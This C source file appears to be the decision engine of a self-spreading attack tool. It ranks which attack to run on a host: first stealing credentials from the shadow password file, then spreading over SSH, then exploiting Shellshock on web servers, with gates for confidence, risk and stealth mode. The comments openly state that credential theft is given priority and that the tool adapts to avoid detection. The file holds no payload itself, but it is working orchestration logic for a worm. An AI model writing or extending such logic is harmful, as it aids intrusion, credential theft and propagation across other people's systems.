#include "decision_engine.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static cve_decision_rule_t decision_rules[MAX_CVE_HANDLERS];
static int num_rules = 0;

/**
 * Initialize Decision Rules
 * Configures priority-ordered decision rules for CVE selection.
 * 
 * Decision Rules:
 *   Each rule defines conditions that must be met for a CVE to be selected:
 *   - priority_order: Lower number = higher priority (evaluated first)
 *   - requires_vulnerable: CVE must be marked vulnerable in scan results
 *   - requires_port_open: Required port number (0 = no port requirement)
 *   - min_confidence: Minimum confidence score required from scan
 *   - max_risk_level: Maximum allowed risk level (CVE skipped if risk exceeds this)
 *   - stealth_required: Whether stealth mode is required for this CVE
 * 
 * Current Rules (in priority order):
 *   1. Shadow Exfiltration (priority -1): Highest priority, steals credentials first
 *   2. SSH Propagation (priority 0): Second priority, spreads to other hosts
 *   3. Shellshock (priority 1): Lower priority, exploits vulnerable web servers
 * 
 * @note Rules are evaluated in priority order. First rule that passes all checks is selected.
 */
void init_decision_rules(void) {
    num_rules = 0;
    
    // Shadow Exfiltration: Highest priority
    decision_rules[0].cve_id = CVE_SHADOW_EXFILTRATION;
    decision_rules[0].priority_order = -1;
    decision_rules[0].requires_vulnerable = 1;
    decision_rules[0].requires_port_open = 0;
    decision_rules[0].min_confidence = 10;
    decision_rules[0].max_risk_level = 10;
    decision_rules[0].stealth_required = 0;
    num_rules = 1;
    
    // SSH Propagation: Second priority
    decision_rules[1].cve_id = CVE_SSH_PROPAGATION;
    decision_rules[1].priority_order = 0;
    decision_rules[1].requires_vulnerable = 1;
    decision_rules[1].requires_port_open = 22;
    decision_rules[1].min_confidence = 7;
    decision_rules[1].max_risk_level = 6;
    decision_rules[1].stealth_required = 0;
    num_rules = 2;
    
    // Shellshock: Lower priority
    decision_rules[2].cve_id = CVE_2014_6271;
    decision_rules[2].priority_order = 1;
    decision_rules[2].requires_vulnerable = 1;
    decision_rules[2].requires_port_open = 80;
    decision_rules[2].min_confidence = 7;
    decision_rules[2].max_risk_level = 5;
    decision_rules[2].stealth_required = 0;
    num_rules = 3;
}

/**
 * Check Vulnerability Requirement
 * Verifies if the CVE meets the vulnerability requirement specified in the rule.
 * 
 * @param rule Decision rule containing vulnerability requirement.
 * @param results Vector of scan results to check against.
 * @return 1 if requirement met (either not required or CVE is vulnerable), 0 otherwise.
 */
static int check_vulnerable(cve_decision_rule_t* rule, cve_result_vector_t* results) {
    if (!rule->requires_vulnerable) {
        return 1;  // No requirement
    }
    
    for (int i = 0; i < results->count; i++) {
        if (results->results[i].cve_id == rule->cve_id) {
            return results->results[i].is_vulnerable;
        }
    }
    return 0;
}

/**
 * Check Port Requirement
 * Verifies if the required port is open as specified in the rule.
 * 
 * @param rule Decision rule containing port requirement.
 * @param results Vector of scan results to check against.
 * @return 1 if requirement met (either no port required or required port is open), 0 otherwise.
 */
static int check_port(cve_decision_rule_t* rule, cve_result_vector_t* results) {
    if (rule->requires_port_open == 0) {
        return 1;  // No port requirement
    }
    
    for (int i = 0; i < results->count; i++) {
        if (results->results[i].cve_id == rule->cve_id) {
            return (results->results[i].port_open == rule->requires_port_open);
        }
    }
    return 0;
}

/**
 * Check Confidence Requirement
 * Verifies if the CVE's confidence score meets the minimum threshold.
 * 
 * @param rule Decision rule containing min_confidence threshold.
 * @param results Vector of scan results to check against.
 * @return 1 if confidence >= min_confidence, 0 otherwise.
 */
static int check_confidence(cve_decision_rule_t* rule, cve_result_vector_t* results) {
    for (int i = 0; i < results->count; i++) {
        if (results->results[i].cve_id == rule->cve_id) {
            return (results->results[i].confidence >= rule->min_confidence);
        }
    }
    return 0;
}

/**
 * Check Risk Level Requirement
 * Verifies if current risk level is within acceptable threshold for this CVE.
 * 
 * @param rule Decision rule containing max_risk_level threshold.
 * @param risk Current risk assessment.
 * @return 1 if total_risk <= max_risk_level, 0 otherwise.
 */
static int check_risk(cve_decision_rule_t* rule, risk_assessment_t* risk) {
    return (risk->total_risk <= rule->max_risk_level);
}

/**
 * Check Mode Compatibility
 * Verifies if current degradation mode is compatible with this CVE.
 * 
 * @param rule Decision rule containing stealth_required flag.
 * @param mode Current degradation mode (NORMAL or STEALTH).
 * @return 1 if mode is compatible:
 *         - If stealth_required=1: mode must be STEALTH
 *         - If stealth_required=0: mode can be NORMAL or STEALTH
 *         0 otherwise.
 */
static int check_mode(cve_decision_rule_t* rule, degradation_mode_t mode) {
    if (rule->stealth_required) {
        return (mode == MODE_STEALTH);
    }
    return (mode == MODE_NORMAL || mode == MODE_STEALTH);
}

/**
 * Make Execution Decision (Phase 2)
 * Selects the highest-priority CVE to execute based on scan results and risk assessment.
 * 
 * Decision Algorithm:
 *   1. Iterate through decision rules in priority order (lowest priority_order first)
 *   2. For each rule, evaluate all requirements:
 *      - Vulnerability status (is CVE vulnerable?)
 *      - Port availability (is required port open?)
 *      - Confidence level (does confidence meet threshold?)
 *      - Risk level (is current risk within acceptable range?)
 *      - Mode compatibility (is degradation mode compatible?)
 *   3. First rule that passes all checks is selected
 *   4. If no rule passes, no execution is performed
 * 
 * @param scan_results Vector of scan results from Phase 1, indicating vulnerabilities found.
 * @param risk Current risk assessment from Phase 0, indicating safety level.
 * @param mode Current degradation mode (NORMAL or STEALTH) based on risk level.
 * @return Decision result containing selected_cve_id and should_execute flag.
 * 
 * @note Priority order ensures high-value operations (e.g., credential theft) execute first.
 * @note Risk-based filtering prevents dangerous operations in high-risk environments.
 */
decision_result_t make_decision(cve_result_vector_t* scan_results, 
                                risk_assessment_t* risk, 
                                degradation_mode_t mode) {
    decision_result_t result = {0};
    
    for (int i = 0; i < num_rules; i++) {
        cve_decision_rule_t* rule = &decision_rules[i];
        
        if (!check_vulnerable(rule, scan_results)) continue;
        if (!check_port(rule, scan_results)) continue;
        if (!check_confidence(rule, scan_results)) continue;
        if (!check_risk(rule, risk)) continue;
        if (!check_mode(rule, mode)) continue;
        
        result.selected_cve_id = rule->cve_id;
        result.should_execute = 1;
        return result;
    }
    
    result.should_execute = 0;
    return result;
}

